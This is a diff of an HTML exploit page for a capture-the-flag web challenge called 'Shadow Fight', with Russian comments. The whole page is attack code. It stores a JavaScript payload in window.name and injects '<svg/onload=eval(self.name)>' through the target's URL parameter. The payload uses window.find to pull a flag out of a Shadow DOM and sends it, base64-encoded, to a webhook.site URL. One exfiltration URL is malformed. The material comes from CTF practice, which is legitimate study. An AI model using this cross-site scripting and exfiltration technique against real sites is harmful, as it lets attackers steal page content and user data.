@@ -1,35 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Fix</title>
+    <title>Shadow Fight Exploit</title>
 </head>
 <body>
-    <h3>Redirecting to exploit...</h3>
+    <h1>Exploit loading...</h1>
+    <p>Если видите этот текст, значит эксплойт работает. Смотрите вебхук.</p>
+    
     <script>
-        // 1. Пейлоад.
-        // Обратите внимание: мы используем window.name для хранения кода.
-        window.name = `
-            try {
-                // Ищем текст флага
-                window.find('p_ctf');
-                
-                // Получаем выделение
-                var sel = window.getSelection().anchorNode.textContent;
-                
-                // Отправляем (добавил btoa для безопасности кодировки)
-                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + btoa(sel));
-            } catch(e) {
-                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=' + e.message);
-            }
+        // 1. Код, который выполнится внутри задачи
+        // Мы используем backticks (`) для многострочного текста
+        var payload = `
+            setTimeout(function() {
+                try {
+                    // Пытаемся найти текст флага
+                    // window.find заставляет браузер выделить скрытый текст в Shadow DOM
+                    window.find('p_ctf');
+                    
+                    var sel = window.getSelection();
+                    if (sel && sel.anchorNode) {
+                        var flag = sel.anchorNode.textContent;
+                        // Отправляем флаг (кодируем в base64, чтобы не ломать URL)
+                        fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44flag=' + btoa(flag));
+                    } else {
+                        // Если не нашли, отправляем ошибку
+                        fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=NotFound');
+                    }
+                } catch (e) {
+                    // Если произошла ошибка JS
+                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=' + btoa(e.toString()));
+                }
+            }, 2000); // Ждем 2 секунды полной загрузки
         `;
 
-        // 2. Целевая ссылка.
-        // ВАЖНО: заменили eval(name) на eval(self.name)
-        // self.name всегда указывает на хранилище window.name
-        var target = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(self.name)%3E&avatar=https://picsum.photos/100";
-
-        // 3. Редирект
-        window.location.href = target;
+        // 2. Создаем iframe
+        var iframe = document.createElement('iframe');
+        
+        // 3. ПРИСВАИВАЕМ ИМЯ ОКНА IFRAME
+        // Именно отсюда eval(self.name) возьмет наш код
+        iframe.name = payload;
+        
+        // 4. Ссылка на задачу
+        // Используем self.name, чтобы обратиться к имени текущего окна (iframe)
+        iframe.src = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(self.name)%3E&avatar=https://picsum.photos/100";
+        
+        // Сделаем iframe большим, чтобы window.find точно сработал (браузеры не ищут в скрытых фреймах)
+        iframe.style.width = "100%";
+        iframe.style.height = "800px";
+        iframe.style.border = "1px solid red";
+        
+        document.body.appendChild(iframe);
     </script>
 </body>
 </html>
